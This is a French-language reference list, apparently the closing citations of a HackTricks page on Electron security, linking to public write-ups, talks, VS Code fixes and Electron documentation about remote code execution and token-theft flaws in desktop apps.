- [9] [Les dangers de shell.openExternal() dans Electron - de nombreuses voies vers l’exécution de code à distance](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Autoriser les URL arbitraires, c’est s’attendre à une exécution de code arbitraire](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [Obtenir une RCE dans un célèbre outil de messagerie japonais grâce à une fonctionnalité Electron obsolète](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - Exécution de code à distance](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - Exécution de code à distance en mode restreint (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [Vol de token GitHub en un clic via l’injection d’événements clavier dans VS Code Webview](https://blog.ammaraskar.com/github-token-stealing)
- [15] [Problème VS Code #319593 : les Webviews peuvent déclencher des raccourcis clavier arbitraires dans l’espace de travail principal](https://github.com/microsoft/vscode/issues/319593)
- [16] [PR VS Code #319705 : confirmer l’ouverture des notebooks et cesser d’accepter le contexte installExtension fourni par l’appelant](https://github.com/microsoft/vscode/pull/319705)
- [17] [PR VS Code #319813 : bloquer la redistribution programmatique des événements de pression de touche et de clic dans les Webviews de notebooks](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / extensions d’espace de travail local](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom : comment j’ai piraté tous les principaux IDE en deux semaines](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt : pwning des applications de bureau populaires et découverte d’une nouvelle surface d’attaque sur Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Sécurité d’Electron](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [webPreferences de BrowserWindow dans Electron](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA : rétro-ingénierie de tout](https://github.com/morluto/rea)
- [24] [Reconstruction d’artefacts JavaScript avec REA](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [Workflows d’applications JavaScript multicouches avec REA](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
